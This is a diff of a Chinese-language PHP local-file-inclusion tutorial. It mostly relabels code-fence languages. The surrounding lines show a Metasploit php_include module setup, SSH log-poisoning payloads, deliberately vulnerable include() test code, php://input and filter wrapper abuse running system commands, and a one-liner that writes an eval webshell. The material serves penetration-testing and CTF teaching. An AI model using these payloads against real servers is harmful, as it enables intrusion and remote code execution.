@@ -400,7 +400,7 @@ phpstudy的Apache默认路径C:\phpStudy\PHPTutorial\Apache\conf\extra\httpd-vho
 
 ### **7.5本地文件包含之MSF攻击模块**
 
-```text
+```bash
 use exploit/unix/webapp/php_include
 set rhost 192.168.159.128
 set rport 80
@@ -429,13 +429,13 @@ exploit -z
 
 Linux默认日志位置在`/var/log/auth.log`
 
-```text
+```bash
 ssh -p 22 "<?php phpinfo(); ?>"@目标ip地址
 ```
 
 案例
 
-```text
+```bash
 ssh '<?php phpinfo();?>'@192.168.136.143
 ```
 
@@ -477,7 +477,7 @@ ssh '<?php phpinfo();?>'@192.168.136.143
 
 首先进入执行SQL语言地方，执行如下操作
 
-```text
+```sql
 select '<?php phpinfo();?>'
 ```
 
@@ -614,7 +614,7 @@ PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符�
 
 代码演示
 
-```text
+```php
 //include.php
 <?php
     $file  = $_GET['file'];
@@ -624,7 +624,7 @@ PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符�
 
 
 
-```text
+```php
 //include.php
 <?php
     $file  = $_GET['file'];
@@ -634,7 +634,7 @@ PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符�
 
 
 
-```text
+```php
 //include.php
 <?php
     $file  = $_GET['file'];
@@ -653,7 +653,7 @@ PHP 内核是由 C 语言实现的，因此使用了 C 语言中的一些字符�
 * windows下目录路径最大长度为256字节，超出部分将丢弃
 *  Linux下目录最大长度为4096字节，超出长度将丢弃
 
-```text
+```php
 <?php
     $filename  = $_GET['filename'];
     include($filename . ".html");
@@ -672,7 +672,7 @@ http://www.test.com/FI/FI.php?filename=test.txt/././././././././././././././././
 
 测试代码：
 
-```text
+```php
 <?php
     $filename  = $_GET['filename'];
     include($filename . ".html");
@@ -690,7 +690,7 @@ http://www.test.com/FI/FI.php
 
 测试代码：
 
-```text
+```php
 <?php 
 $a = $_GET['page'].'.php';
 include $a;
@@ -739,7 +739,7 @@ include $a;
 
 **测试代码：**
 
-```text
+```php
 <?php
     $filename  = $_GET['file'];
     include($file);
@@ -810,7 +810,7 @@ include $a;
 
 **测试代码：**
 
-```text
+```php
 <?php 
 include($_GET['filename'] . ".html"); 
 ?>
@@ -1004,7 +1004,7 @@ _php各种伪协议参考:_[_http://php.net/manual/zh/wrappers.php.php_](http://
 
 ### 12.2 file://协议
 
-```text
+```kotlin
 PHP.ini：
 file:// 协议在双off的情况下也可以正常使用；
 allow_url_fopen ：off/on
@@ -1016,7 +1016,7 @@ allow_url_include：off/on
 
 **测试代码：**
 
-```text
+```php
 <?php
 @include($_GET["x"]);
 ?>
@@ -1075,7 +1075,7 @@ php://input可以访问请求的原始数据的只读流，将post请求的数�
 
 **测试代码：**
 
-```text
+```php
 <meta charset="utf-8">
 <?php
 error_reporting(0);
@@ -1108,7 +1108,7 @@ http://127.0.0.1/ctf/2/php_input.php?file=php://input<?php phpinfo(); ?>
 
 **2.利用php://input system来执行当前系统的操作目录**
 
-```text
+```php
 <?php system("dir"); ?>
 ```
 
@@ -1120,13 +1120,13 @@ http://127.0.0.1/ctf/2/php_input.php?file=php://input<?php phpinfo(); ?>
 
 既然可以执行php代码那么可以利用来生成一个一句话木马文件
 
-```text
+```php
 <?PHP fputs(fopen('shell.php','w'),'<?php @eval($_POST[key])?>');?>
-fputs写文件
-fopen获取了shell.php的对象
-w 写的操作 i是写
-一句话木马
-如果一句话木马内容为双引号那么不会成功执行
+//fputs写文件
+//fopen获取了shell.php的对象
+//w 写的操作 i是写
+//一句话木马
+//如果一句话木马内容为双引号那么不会成功执行
 ```
 
 ![](../../.gitbook/assets/image%20%28937%29.png)
@@ -1156,7 +1156,7 @@ php://filter **参数**
 
 这个参数必须位于 php://filter 的末尾，并且指向需要过滤筛选的数据流。
 
-```text
+```php
 <?php
 /* 这简单等同于：
   readfile("http://www.example.com");
@@ -1171,7 +1171,7 @@ readfile("php://filter/resource=http://www.example.com");    //readfile文件读
 
 这个参数采用一个或以管道符 \| 分隔的多个过滤器名称。
 
-```text
+```php
 <?php
 /* 这会以大写字母输出 www.example.com 的全部内容 */
 readfile("php://filter/read=string.toupper/resource=http://www.example.com");    //通过php伪协议的php://filter指定read等于string.toupper编码方式 resource是网址
@@ -1187,7 +1187,7 @@ readfile("php://filter/read=string.toupper|string.rot13/resource=http://www.exam
 
 这个参数采用一个或以管道符 \| 分隔的多个过滤器名称。
 
-```text
+```php
 <?php
 /* 这会通过 rot13 过滤器筛选出字符 "Hello World"
   然后写入当前目录下的 example.txt */
@@ -1201,7 +1201,7 @@ file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello 
 
 **index.html**
 
-```text
+```markup
 <!DOCTYPE html>
 <html>
     <head>
@@ -1216,7 +1216,7 @@ file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello 
 
 **index.php**
 
-```text
+```php
 <html>
     <title>Bugku-ctf</title>
     
@@ -1236,7 +1236,7 @@ file_put_contents("php://filter/write=string.rot13/resource=example.txt","Hello 
 
 **show.php**
 
-```text
+```php
 <html>
     <title>Bugku-ctf</title>
     
@@ -1272,7 +1272,7 @@ PGh0bWw+DQogICAgPHRpdGxlPkJ1Z2t1LWN0ZjwvdGl0bGU+DQogICAgDQo8P3BocA0KCWVycm9yX3Jl
 
 **测试代码：**
 
-```text
+```php
 <?php  
 $code=$_GET["a"];  
 file_put_contents($code,"test");   
@@ -1330,7 +1330,7 @@ php 版本大于等于 php5.3.0
 
 //index.php
 
-```text
+```php
 <meta charset="utf8">
 <?php
 error_reporting(0);
@@ -1348,7 +1348,7 @@ if(stristr($file,"input")||stristr($file, "filter")||stristr($file,"data")/*||st
 
 //upload.php
 
-```text
+```php
 <meta charset="utf-8">
 <form action="upload.php" method="post" enctype="multipart/form-data" >
      <input type="file" name="fupload" />
@@ -1451,7 +1451,7 @@ pyload:[`http://127.0.0.1/xxx.php?a=compress.bzip2://C:/Users/liuxianglai/Deskto
 
 
 
-```text
+```php
 # 1.jpg 代码
 <?php phpinfo(); ?>
 ```
@@ -1497,7 +1497,7 @@ data://：将原本的include的文件流重定向到了用户可控制的输入
 **测试代码：**  
 
 
-```text
+```php
 //include.php 
 <?php 
     @$file = $_GET['file']; 
@@ -1555,7 +1555,7 @@ data://：将原本的include的文件流重定向到了用户可控制的输入
 
 ## 13、
 
-```text
+```php
 # 例如这样限制了我们只能包含 .html 的文件
 # 文件名称: 2.php
 
